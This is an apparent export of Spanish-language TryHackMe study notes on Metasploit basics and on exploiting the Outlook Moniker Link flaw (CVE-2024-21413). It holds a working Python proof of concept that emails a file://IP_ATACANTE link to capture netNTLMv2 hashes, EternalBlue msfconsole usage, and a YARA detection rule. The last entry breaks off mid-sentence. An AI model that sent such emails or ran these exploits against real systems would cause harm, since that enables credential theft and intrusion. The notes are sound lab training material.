    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 2. Metasploit - Introduction",
    "content": "Metasploit es uno de los marcos de trabajo más usados. Es una herramienta poderosa que puede aguantar todas las fases del engagement del pentesting, desde la recopilación de información hasta la post explotación.\n\nMetasploit tiene dos versiones principales:\n\n- **Metasploit Pro**: La versión comercial que facilita la automatización del manejo de tareas. Esta versión tiene una interfaz gráfica de usuario.\n- **Metasploit Framework**: La versión de código abierto que funciona desde la linea de comandos.\n\nEl Framework Metasploit es un conjunto de herramientas que permite recopilación de información, escaneo, explotación, desarrollo de explotación, post explotación y más. Aunque el uso primario de metasploit se centra en el pentesting, también es útil para la búsqueda de vulnerabilidades y desarrollo de exploits.\n\nLos componentes principales de Metasploit pueden ser resumidos de la siguiente manera:\n\n- **msfcosole**: La línea de comandos principal.\n- **Módulos**: Módulos soportados, como exploits, escáners, payloads, etc.\n- **Herramientas**: Las herramientas en sí que te ayudarán a buscar vulnerabilidades y al pentest. Algunas de estas herramientas son msfvenom, patter_create y pattern_offset.\n\nEsta unidad cubrirá los componentes principales de Metasploit mientras ofrece una base sólida sobre cómo encontrar exploits relevantes, configurar parámetros y explotar servicios vulnerables en el sistema objetivo."
  },
  {
    "title": "2. Main Components of Metasploit",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/2-metasploit-introduction/2-main-components-of-metasploit/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/2. Metasploit - Introduction/2. Main Components of Metasploit.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 2. Metasploit - Introduction",
    "content": "Al usar metasploit, primariamente interactuaremos con la consola de metasploit. Podemos lanzar la consola usando `msfconsole`. Esta será nuestra manera de interactuar con los módulos de metasploit. Los módulos son componentes pequeños dentro del marco de trabajo de metasploit y son construidos para realizar una tarea específica, como explotar una vulnerabilidad, escanear un objetivo, o realizar un  ataque de fuerza bruta.\n\nAntes de adentrarnos en los módulos, sería de ayuda aclarar algunos conceptos recurrentes: vulnerabilidad, exploit y payload.\n\n- **Exploit**: Una pieza de código que usa una vulnerabilidad presente en el sistema objetivo.\n- **Vulnerabilidad**: Un error de diseño, programación o lógica que afecta al sistema objetivo. La explotación de una vulnerabilidad puede resultar en la recopilación de información confidencial, o permitir al atacante ejecutar código en el sistema objetivo.\n- **Payload**: Un exploit se aprovechará de una vulnerabilidad. Sin embargo, si queremos que el exploit tenga el resultado que queremos, necesitamos usar un payload. El payload es el código que se ejecutará en el sistema objetivo.\n\nLos módulos y categorías debajo de cada uno están listados abajo. Estos se dan por motivos de referencia, pero interactuarás con ellos a través de la consola de metasploit.\n\n------------------\n<h2>Auxiliary</h2>\nCualquier módulo de soporte como escáners, crawlers y fuzzers pueden encontrarse aquí.\n\n```bash\nroot@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 auxiliary/\nauxiliary/\n├── admin\n├── analyze\n├── bnat\n├── client\n├── cloud\n├── crawler\n├── docx\n├── dos\n├── example.py\n├── example.rb\n├── fileformat\n├── fuzzers\n├── gather\n├── parser\n├── pdf\n├── scanner\n├── server\n├── sniffer\n├── spoof\n├── sqli\n├── voip\n└── vsploit\n\n20 directories, 2 files\n```\n\n---------------------\n<h2>Encoders</h2>\nPermiten encodear el exploit y el payload con la esperanza de que un antivirus basado en firmas no los detecte.\n\nLos antivirus y soluciones de seguridad basadas en firmas tienen una base de amenazas conocidas. Estos comparan los archivos sospechosos con la base de datos y mandan alertas si hay coincidencias. Los encoders tienen una tasa de éxito limitada porque estos pueden hacer comprobaciones adicionales.\n\n```bash\nroot@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 encoders/\nencoders/\n├── cmd\n├── generic\n├── mipsbe\n├── mipsle\n├── php\n├── ppc\n├── ruby\n├── sparc\n├── x64\n└── x86\n\n10 directories, 0 files\n```\n\n----------------\n<h2>Evasion</h2>\nMientras que los encoders encodearán el payload, no son considerados un intento directo de evadir el antivirus. Por otro lado, los módulos de evasión intentarán eso.\n\n```bash\nroot@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 2 evasion/\nevasion/\n└── windows\n    ├── applocker_evasion_install_util.rb\n    ├── applocker_evasion_msbuild.rb\n    ├── applocker_evasion_presentationhost.rb\n    ├── applocker_evasion_regasm_regsvcs.rb\n    ├── applocker_evasion_workflow_compiler.rb\n    ├── process_herpaderping.rb\n    ├── syscall_inject.rb\n    ├── windows_defender_exe.rb\n    └── windows_defender_js_hta.rb\n\n1 directory, 9 files\n```\n\n----------------\n<h2>Exploits</h2>\nLos exploits, organizados por sistema objetivo.\n\n```bash\nroot@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 exploits/\nexploits/\n├── aix\n├── android\n├── apple_ios\n├── bsd\n├── bsdi\n├── dialup\n├── example_linux_priv_esc.rb\n├── example.py\n├── example.rb\n├── example_webapp.rb\n├── firefox\n├── freebsd\n├── hpux\n├── irix\n├── linux\n├── mainframe\n├── multi\n├── netware\n├── openbsd\n├── osx\n├── qnx\n├── solaris\n├── unix\n└── windows\n\n20 directories, 4 files\n```\n\n-------------\n<h2>NOPs</h2>\nLos NOPs (No OPeration) no hacen nada, literalmente. Se representan en la familia Intel x86 con 0x90. la CPU no hará nada por un ciclo. Normalmente se usan como un buffer para conseguir tamaños de payload constantes.\n\n```bash\nroot@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 nops/\nnops/\n├── aarch64\n├── armle\n├── cmd\n├── mipsbe\n├── php\n├── ppc\n├── sparc\n├── tty\n├── x64\n└── x86\n\n10 directories, 0 files\n```\n\n---------------\n<h2>Payloads</h2>\nLos payloads son códigos que se ejecutan en el sistema objetivo.\n\nLos exploits usarán una vulnerabilidad del sistema objetivo, pero para conseguir el resultado deseado, necesitaremos un payload. Lanzar la calculadora ejecutando calc.exe en el sistema objetivo es una forma benigna de demostrar que podemos ejecutar comandos en el equipo objetivo.\n\nEjecutar comandos en el equipo objetivo ya es un paso importante pero tener una conexión interactiva que permite escribir comandos es mejor. Esto se conoce como una \"reverse shell\".\n\n```bash\nroot@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 payloads/\npayloads/\n├── adapters\n├── singles\n├── stagers\n└── stages\n\n4 directories, 0 files\n```\n\nVemos 4 directorios diferentes debajo de \"payloads\": adaptadores, singles, stagers y stages.\n\n- **Adapters**: Un adapter envuelve payloads single para convertirlos en diferentes formatos. Por ejemplo, un payload de tamaño normal puede  ser envuelto  en  un  Powershell adapter, lo que hará un sólo comando de powershell que ejecutará el código.\n- **Singles**: Payloads autocontenidos que no necesitan descargar un componente adicional para ejecutarse.\n- **Stagers**: Responsables de configurar un canal de conexión entre Metasploit y el sistema ojetivo. Útil cuando se trabaja con payloads staged. Estos primero subirán un stager en el sistema objetivo y después descargarán el resto del payload . Esto ofrece algunas ventajas como el tamaño del payload.\n- **Stages**: Descargados por el stager. Esto te permitirá usar payloads de mayor tamaño.\n\nMetasploit tiene un método de ayudarte a identificar payloads single (también llamados \"inline\") y payloads staged.\n\n- generic/shell_reverse_tcp\n- windows/x64/shell/reverse_tcp\n\nAmbas son shells de Windows. La primera es una inline como está indicado por el  \" _ \" entre \"shell\" y \"reverse\". Mientras que la segunda es un payload stage como es indicado por \"/\" entre \"shell\" y \"reverse\".\n\n-------------\n<h2>Post</h2>\nLos módulos post son útiles en la parte final del proceso de pentesting, post-explotación.\n\n```bash\nroot@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 post/\npost/\n├── aix\n├── android\n├── apple_ios\n├── bsd\n├── firefox\n├── hardware\n├── linux\n├── multi\n├── networking\n├── osx\n├── solaris\n└── windows\n\n12 directories, 0 files\n```\n\nSi quieres familiarizarte con estos módulos puedes encontrarlos en `/opt/metasploit-framework/embedded/framework/modules`."
  },
  {
    "title": "3. Msfconsole",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/2-metasploit-introduction/3-msfconsole/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/2. Metasploit - Introduction/3. Msfconsole.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 2. Metasploit - Introduction",
    "content": "Como ya hemos mencionado, la consola ser´a nuestra interfaz principal. Podemos lanzarla usando el comando `msfconsole`.\n\nUna vez abierta, veremos que la linea de comandos cambia a `msf6`. La línea de comandos de metasploit puede ser usada como una linea de comandos normal, ejecutando por ejemplo `ls` para listar los contenidos del directorio desde el  cual se lanzó. Seguido de un `ping` mandado a Google (8.8.8.8).\n\n```bash\nmsf6 > ls\n[*] exec: ls\n\nburpsuite_community_linux_v2021_8_1.sh\tInstructions  Scripts\nDesktop\t\t\t\t\tPictures      thinclient_drives\nDownloads\t\t\t\tPostman       Tools\nmsf6 > ping -c 1 8.8.8.8\n[*] exec: ping -c 1 8.8.8.8\n\nPING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.\n64 bytes from 8.8.8.8: icmp_seq=1 ttl=109 time=1.33 ms\n\n--- 8.8.8.8 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 1.335/1.335/1.335/0.000 ms\nmsf6 >\n```\n\nSoportará la mayoría de comandos Linux, incluyendo `clear`, pero no dejará usar ciertas funciones (como la redirección `>`).\n\n```bash\nmsf6 > help > help.txt\n[-] No such command\nmsf6 >\n```\n\nEl comando `help` puede ser usado por sí mismo o para un comando específico. Debajo un ejemplo para el comando `set`, que veremos más adelante.\n\n```bash\nmsf6 > help set\nUsage: set [option] [value]\n\nSet the given option to value.  If value is omitted, print the current value.\nIf both are omitted, print options that are currently set.\n\nIf run from a module context, this will set the value in the module's\ndatastore.  Use -g to operate on the global datastore.\n\nIf setting a PAYLOAD, this command can take an index from `show payloads'.\n\nmsf6 >\n```\n\nPodemos usar el comando `history` para ver el historial de los comandos ejecutados en la consola.\n\nUna característica importante de msfconsole es que integra autocompletado por tabulación, lo que nos será muy útil más adelante cuando usemos comandos o módulos de Metasploit.\n\nMsfconsole es dirigida por contexto; esto significa que al menos que estén definidos como variables globales, todos los parámetros del módulo se perderán si cambias de módulo. En el ejemplo de abajo hemos usado el exxploit `ms17_010_eternalblue`, y configurado los parámetros como `RHOSTS`. Si cambiásemos a otro módulo, como port scanner, necesitaríamos configurar `RHOSTS` de nuevo. Vamos a ver el ejemplo:\n\nUna vez que escribimos el comando `use exploit/windows/smb/ms17_010_eternalblue`, veremos que la linea de comandos cambia de `msf6` a `msf6 exploit(windows/smb/ms17_010_eternalblue)`. El exploit EternalBlue fue diseñado por la Agencia Nacional de Seguridad de los EE.UU. (N.S.A.) para una vulnerabilidad que afectaba a los servidores SMBv1 en numerosos sistemas Windows. El protocolo SMB es comunmente usado en las redes Windows para compartir archivos y mandar archivos a impresoras. EternalBlue fue filtrado por la organización cibercriminal \"Shadow Brokers\" en Abril de 2017. En mayo de ese mismo año, esta vulnerabilidad fue explotada a nivel mundial por el ataque de ransomware \"WannaCry\".\n\n```bash\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue \n[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(windows/smb/ms17_010_eternalblue) >\n```\n\nEl módulo puede ser seleccionado con el comando `use` seguido del número al comienzo de la linea de búsqueda.\n\nMientras que el prompt ha cambiado, notarás que puedes seguir ejecutando comandos como los mencionados anteriormente. Esto significa que no entramos en un directorio como normalmente lo haríamos. La linea nos dirá que tenemos un contexto en el que debemos trabajar. Puedes ver esto escribiendo `show options`.\n\n```bash\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > show options\n\nModule options (exploit/windows/smb/ms17_010_eternalblue):\n\n   Name           Current Setting  Required  Description\n   ----           ---------------  --------  -----------\n   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'\n   RPORT          445              yes       The target port (TCP)\n   SMBDomain      .                no        (Optional) The Windows domain to use for authentication\n   SMBPass                         no        (Optional) The password for the specified username\n   SMBUser                         no        (Optional) The username to authenticate as\n   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.\n   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.\n\n\nPayload options (windows/x64/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     10.10.220.191    yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Windows 7 and Server 2008 R2 (x64) All Service Packs\n\n\nmsf6 exploit(windows/smb/ms17_010_eternalblue) >\n```\n\nEsto mostrará opciones relacionadas con el exploit que hemos elegido antes. El comando `show options` tendrá diferentes salidas dependiendo del contexto en el que sea usado. El ejemplo de arriba muestra que en este exploit, necesitaríamos configurar variables como `RHOSTS` y `RPORT`. Por otro lado un módulo de post-explotación, puede que sólo necesite que configuremos un `SESSION ID`. Una sesión es una conexión existente al sistema objetivo que el módulo de post-explotación usará.\n\n```bash\nmsf6 post(windows/gather/enum_domain_users) > show options\n\nModule options (post/windows/gather/enum_domain_users):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   HOST                      no        Target a specific host\n   SESSION                   yes       The session to run this module on.\n   USER                      no        Target User for NetSessionEnum\n\nmsf6 post(windows/gather/enum_domain_users) >\n```\n\nEl comando `show` puede ser usado en cualquier contexto seguido de un tipo de módulo (auxiliary, payload, exploit, etc.) para listar los módulos disponibles.\n\n```bash\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads\n\nCompatible Payloads\n===================\n\n   #   Name                                        Disclosure Date  Rank    Check  Description\n   -   ----                                        ---------------  ----    -----  -----------\n   0   generic/custom                                               manual  No     Custom Payload\n   1   generic/shell_bind_tcp                                       manual  No     Generic Command Shell, Bind TCP Inline\n   2   generic/shell_reverse_tcp                                    manual  No     Generic Command Shell, Reverse TCP Inline\n   3   windows/x64/exec                                             manual  No     Windows x64 Execute Command\n   4   windows/x64/loadlibrary                                      manual  No     Windows x64 LoadLibrary Path\n   5   windows/x64/messagebox                                       manual  No     Windows MessageBox x64\n   6   windows/x64/meterpreter/bind_ipv6_tcp                        manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager\n   7   windows/x64/meterpreter/bind_ipv6_tcp_uuid                   manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support \n```\n\nSi se usa desde la prompt de msfconsole, `show` mostrará todos los módulos.\n\nPuedes abandonar el contexto usando el comando `back`.\n\n```bash\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > back\nmsf6 > \n```\n\nPara conseguir más información de cualquier módulo puedes escribir el comando `info` dentrro de su contexto.\n\n```bash\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > info\n\n       Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption\n     Module: exploit/windows/smb/ms17_010_eternalblue\n   Platform: Windows\n       Arch: \n Privileged: Yes\n    License: Metasploit Framework License (BSD)\n       Rank: Average\n  Disclosed: 2017-03-14\n\nProvided by:\n  Sean Dillon \n  Dylan Davis \n  Equation Group\n  Shadow Brokers\n  thelightcosine\n\nAvailable targets:\n  Id  Name\n  --  ----\n  0   Windows 7 and Server 2008 R2 (x64) All Service Packs\n\nCheck supported:\n  Yes\n\nBasic options:\n  Name           Current Setting  Required  Description\n  ----           ---------------  --------  -----------\n  RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'\n  RPORT          445              yes       The target port (TCP)\n  SMBDomain      .                no        (Optional) The Windows domain to use for authentication\n  SMBPass                         no        (Optional) The password for the specified username\n  SMBUser                         no        (Optional) The username to authenticate as\n  VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.\n  VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.\n\nPayload information:\n  Space: 2000\n\nDescription:\n  This module is a port of the Equation Group ETERNALBLUE exploit, \n  part of the FuzzBunch toolkit released by Shadow Brokers. There is a \n  buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is \n  calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error \n  where a DWORD is subtracted into a WORD. The kernel pool is groomed \n  so that overflow is well laid-out to overwrite an SMBv1 buffer. \n  Actual RIP hijack is later completed in \n  srvnet!SrvNetWskReceiveComplete. This exploit, like the original may \n  not trigger 100% of the time, and should be run continuously until \n  triggered. It seems like the pool will get hot streaks and need a \n  cool down period before the shells rain in again. The module will \n  attempt to use Anonymous login, by default, to authenticate to \n  perform the exploit. If the user supplies credentials in the \n  SMBUser, SMBPass, and SMBDomain options it will use those instead. \n  On some systems, this module may cause system instability and \n  crashes, such as a BSOD or a reboot. This may be more likely with \n  some payloads.\n\nReferences:\n  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010\n  https://cvedetails.com/cve/CVE-2017-0143/\n  https://cvedetails.com/cve/CVE-2017-0144/\n  https://cvedetails.com/cve/CVE-2017-0145/\n  https://cvedetails.com/cve/CVE-2017-0146/\n  https://cvedetails.com/cve/CVE-2017-0147/\n  https://cvedetails.com/cve/CVE-2017-0148/\n  https://github.com/RiskSense-Ops/MS17-010\n\nAlso known as:\n  ETERNALBLUE\n\nmsf6 exploit(windows/smb/ms17_010_eternalblue) >\n```\n\nDe forma alternativa, puedes usar el comando `info` seguido de la ruta al módulo desde el prompt de msfconsole. `info` no es un menú de ayuda, dará información detallada como quién es el autor, fuentes relevantes, etc.\n\n-------------------\n<h2>Search</h2>\nUno de los comandos más útiles que tiene msfconsole es `search`. Este comando buscará en la base de datos del Framework de Metasploit por módulos relevantes al parámetro dado. Puedes conducir búsquedas usando números CVE, nombres de exploits o sistema objetivo.\n\n```bash\nmsf6 > search ms17-010\n\nMatching Modules\n================\n\n   #  Name                                      Disclosure Date  Rank     Check  Description\n   -  ----                                      ---------------  ----     -----  -----------\n   0  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution\n   1  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection\n   2  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption\n   3  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution\n   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution\n\n\nInteract with a module by name or index, for example use 4 or use exploit/windows/smb/smb_doublepulsar_rce\n\nmsf6 >\n```\n\nLa salida del comando `search` ofrece una vista genérica de cada módulo devuelto. Puede que notes que la columna \"nombre\" ya da más información que el nombre del módulo. Puedes ver el tipo de módulo, y la categoría del módulo. Puedes usar el comando `use` seguido del número del módulo que te devuelve la búsqueda (`use 0` en vez de `use auxiliary/admin/smb/ms17_010_command`).\n\nOtra pieza importante de información está en la columna \"rank\", que califica los exploits basado en su confiabilidad.\n\n![[136.png]]\n\nPuedes dirigir la función de búsqueda usando palabras como `type` y `platform`.\n\nPor ejemplo, si quisiéramos que nuestros resultados sólo incluyeran módulos auxiliary, podríamos configurar el tipo a este.\n\n```bash\nmsf6 > search type:auxiliary telnet\n\nMatching Modules\n================\n\n   #   Name                                                Disclosure Date  Rank    Check  Description\n   -   ----                                                ---------------  ----    -----  -----------\n   0   auxiliary/admin/http/dlink_dir_300_600_exec_noauth  2013-02-04       normal  No     D-Link DIR-600 / DIR-300 Unauthenticated Remote Command Execution\n   1   auxiliary/admin/http/netgear_r6700_pass_reset       2020-06-15       normal  Yes    Netgear R6700v3 Unauthenticated LAN Admin Password Reset\n   2   auxiliary/dos/cisco/ios_telnet_rocem                2017-03-17       normal  No     Cisco IOS Telnet Denial of Service\n   3   auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof        2010-12-21       normal  No     Microsoft IIS FTP Server Encoded Response Overflow Trigger\n   4   auxiliary/scanner/ssh/juniper_backdoor              2015-12-20       normal  No     Juniper SSH Backdoor Scanner\n   5   auxiliary/scanner/telnet/brocade_enable_login                        normal  No     Brocade Enable Login Check Scanner\n   6   auxiliary/scanner/telnet/lantronix_telnet_password                   normal  No     Lantronix Telnet Password Recovery\n   7   auxiliary/scanner/telnet/lantronix_telnet_version                    normal  No     Lantronix Telnet Service Banner Detection\n   8   auxiliary/scanner/telnet/satel_cmd_exec             2017-04-07       normal  No     Satel Iberia SenNet Data Logger and Electricity Meters Command Injection Vulnerability\n   9   auxiliary/scanner/telnet/telnet_encrypt_overflow                     normal  No     Telnet Service Encryption Key ID Overflow Detection\n   10  auxiliary/scanner/telnet/telnet_login                                normal  No     Telnet Login Check Scanner\n   11  auxiliary/scanner/telnet/telnet_ruggedcom                            normal  No     RuggedCom Telnet Password Generator\n   12  auxiliary/scanner/telnet/telnet_version                              normal  No     Telnet Service Banner Detection\n   13  auxiliary/server/capture/telnet                                      normal  No     Authentication Capture: Telnet\n\n\nInteract with a module by name or index, for example use 13 or use auxiliary/server/capture/telnet\n\nmsf6 >\n```\n\nRecuerda que los exploits se aprovechan de vulnerabilidades en el equipo objetivo, y que por lo tanto, un exploit calificado como bajo puede funcionar mientras que uno calificado como alto puede no funcionar o incluso colapsar el sistema."
  },
  {
    "title": "3. Exploitation",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/1-moniker-link-cve-2024-21413/3-exploitation/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/1. Moniker Link (CVE-2024-21413)/3. Exploitation.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 1. Moniker Link (CVE-2024-21413)",
    "content": "Para este ataque, mandaremos un email a nuestra víctima con un Moniker Link similar al visto en la lección anterior. El objetivo, como atacante, es hacer un email con un link moniker que bypassee la vista protegida de Outlook. donde el cliente de la víctima intente cargar un archivo de nuestra máquina de atacante, resultando en la captura del hash netNTLMv2.\n\nPero antes de comenzar, veremos una prueba de concepto.\n\n```python\n'''\nAuthor: CMNatic | https://github.com/cmnatic\nVersion: 1.0 | 119/02/2024\n'''\n\nimport smtplib\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\nfrom email.utils import formataddr\n\nsender_email = 'attacker@monikerlink.thm' #Reemplazar con el email del emisor\nreceiver_email = 'victim@monikerlink.thm' #Reemplazar con el email del receptor\npassword = input(\"Introduce la contraseña del email atacante: \")\nhtml_content = \"\"\"\\\n<!DOCTYPE html>\n<html lang=\"es\">\n\t<body>\n\t\t<p>Haz click<a href=\"file://IP_ATACANTE/test!exploit\">aquí</a></p>\n\t</body>\n</html>\n\"\"\"\n\nmessage = MIMEMultipart()\nmessage['Subject'] = \"CVE-2024-21413\"\nmessage[\"From\"] = formataddr(('CMNatic', sender_email))\nmessage[\"To\"] = receiver_email\n\n#Convierte la string HTML a bytes y lo adjunta al objeto del mensaje\nmsgHtml = MIMEText(html_content, 'html')\nmessage.attach(msgHtml)\n\nserver = smtplib.SMTP('MAILSERVER', 25)\nserver.ehlo()\ntry:\n\tserver.login(sender_email, password)\nexcept Exception as err:\n\tprint(err)\n\texit(-1)\n\ntry:\n\tserver.sendmail(sender_email, [receiver_email], message.as_string())\n\tprint(\"\\n Email delivered\")\nexcept Exception as error:\n\tprint(error)\nfinally:\n\tserver.quit()\n```\n\nLo que hace:\n\n- Coge el email del atacante y de la víctima.\n- Pide la contraseña para autentificar.\n- Contiene el contenido del email (html_content), que contiene el link moniker.\n- Rellena los campos Asunto, De y Para.\n- Finalmente manda el email\n\nVamos a usar Responder para crear un escuchador SMB en nuestra máquina atacante. Para la AttackBox THM, la interfaz será `-I ens5`. El nombre de la interfaz cambiará si lo hacemos en nuestro propio dispositivo.\n\nAbrimos la máquina virtual vía RDP con las credenciales correspondientes:\n\n`xfreerdp3 /u:<usuario> /p:<contraseña> /v:<IP>`\n\nAbrimos Outlook en el escritorio remoto. Una vez abierto hacemos click en \"No quiero iniciar sesión o crear una cuenta\".\n\nEn el segundo pop up le damos a la \"X\" para salir.\n\nEn la siguiente ventana veremos la interfaz de Outlook de la víctima, que ya ha sido configurada.\n\nCopiamos y pegamos el código de la PoC (Proof of Concept) en la máquina atacante.\n\nNecesitaremos hacer un par de cambios en el documento antes de ejecutarlo:\n\n- Cambiar la IP del atacante en la linea 12 a nuestra IP atacante.\n- Cambiar el placeholder de MAILSERVER en la linea 31 con la IP de la víctima.\n\nCuando nos pregunten por la contraseña del correo atacante introducimos `attacker`.\n\nAl hacer esto nos debe llegar un correo con un enlace.\n\nSi en la máquina atacante preparamos un impacket (porque responder no funciona bien en nuestra kali), con: `sudo impacket-smbserver test /home/user/smbshare -smb2support -port 1445`. Al hacer click en el enlace nos aparecerá el nombre de usuario y el hash de autentificación."
  },
  {
    "title": "4. Detection",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/1-moniker-link-cve-2024-21413/4-detection/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/1. Moniker Link (CVE-2024-21413)/4. Detection.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 1. Moniker Link (CVE-2024-21413)",
    "content": "<h2>YARA</h2>\nUna regla Yara ha sido creada por Florian Roth para detectar emails que contienen el elemento `file:\\\\` en el link moniker.\n\n```python\nrule EXPL_CVE_2024_21413_Microsoft_Outlook_RCE_Feb24 {\n\n   meta:\n\n      description = \"Detects emails that contain signs of a method to exploit CVE-2024-21413 in Microsoft Outlook\"\n\n      author = \"X__Junior, Florian Roth\"\n\n      reference = \"https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability/\"\n\n      date = \"2024-02-17\"\n\n      modified = \"2024-02-19\"\n\n      score = 75\n\n   strings:\n\n      $a1 = \"Subject: \"\n\n      $a2 = \"Received: \"\n\n\n\n      $xr1 = /file:\\/\\/\\/\\\\\\\\[^\"']{6,600}\\.(docx|txt|pdf|xlsx|pptx|odt|etc|jpg|png|gif|bmp|tiff|svg|mp4|avi|mov|wmv|flv|mkv|mp3|wav|aac|flac|ogg|wma|exe|msi|bat|cmd|ps1|zip|rar|7z|targz|iso|dll|sys|ini|cfg|reg|html|css|java|py|c|cpp|db|sql|mdb|accdb|sqlite|eml|pst|ost|mbox|htm|php|asp|jsp|xml|ttf|otf|woff|woff2|rtf|chm|hta|js|lnk|vbe|vbs|wsf|xls|xlsm|xltm|xlt|doc|docm|dot|dotm)!/\n\n   condition:\n\n      filesize < 1000KB\n\n      and all of ($a*)\n\n      and 1 of ($xr*)\n\n}\n```\n\n----------------\n<h2>Wireshark</h2>\nAdemás, la petición SMB de la víctima al cliente puede ser vista en una captura de paquetes con un hash netNTLMv2 truncado.\n\n![[135.png]]"
  },
  {
    "title": "5. Remediation",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/1-moniker-link-cve-2024-21413/5-remediation/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/1. Moniker Link (CVE-2024-21413)/5. Remediation.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 1. Moniker Link (CVE-2024-21413)",
    "content": "Microsoft ha incluido parches para resolver esta vulnerabilidad en la \"patch Tuesday release\" de Febrero. Actualizar Windows está altamente aconsejado.\n\nAlgunas recomendaciones para usuarios:\n\n- No hacer click en enlaces random.\n- Previsualizar links antes de hacer click en ellos.\n- Reenviar los emails sospechosos al departamento de cierseguridad.\n\nNo se puede reconfigurar Outlook para que no le afecte esta vulnerabilidad. Además, no se puede capar el protocolo SMB ya que es necesario para las comparticiones por red."
  },
  {
    "title": "2. Moniker Link (CVE-2024-21413)",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/1-moniker-link-cve-2024-21413/2-moniker-link-cve-2024-21413/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/1. Moniker Link (CVE-2024-21413)/2. Moniker Link (CVE-2024-21413).md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 1. Moniker Link (CVE-2024-21413)",
    "content": "Outlook puede renderizar emails como HTML. Además, Outlook puede parsear hiperlinks como HTTP y HTTPS. De cualquier forma, también puede abrir enlaces especificando aplicaciones, conocido como Moniker Links. Normalmente, Outlook lanza un mensaje de riesgo de seguridad cuando se disparan aplicaciones externas.\n\n![[134.jpg]]\n\nEste pop-up es el resultado del modo \"Vista Protegida\" de Outlook. Este modo abre emails que contienen archivos adjuntos, hiperlinks y demás en modo de sólo lectura, bloqueando cosas como las macros.\n\nAl usar `file://` en el moniker link podemos decirle a Outlook que acceda a un archivo, como uno en la red compartida (`a href=\"file://IP_ATACANTE/test>Click me</a>`). El protocolo SMB es usado, lo que implica usar credenciales locales para autentificación. Sin embargo, el modo \"vista protegida\" atrapa y bloquea este intento.\n\n```html\n<p><a href=\"file://IP_ATACANTE/test\">Click me</a></p>\n```\n\nLa vulnerabilidad aquí existe al modificar el hiperenlace para incluir el carácter especial `!`, lo que resulta en el 